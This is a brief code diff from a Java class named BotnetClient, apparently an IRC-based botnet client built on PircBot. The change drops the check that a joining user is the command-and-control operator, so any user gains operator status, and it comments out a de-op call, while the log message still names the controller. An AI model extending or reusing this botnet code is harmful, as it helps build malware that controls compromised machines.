@@ -203,11 +203,9 @@ public class BotnetClient extends PircBot {
 	}
 	
 	protected void onJoin(String channel, String sender, String login, String hostname) {
-		if (sender.equals(CC)) {
 			op(CHANNEL, sender);
-			deOp(CHANNEL, id);
+			//deOp(CHANNEL, id);
 			System.out.println("Operator status given to " + CC);
-		}
 	}
 	
 	protected void onIncomingFileTransfer(DccFileTransfer transfer) {
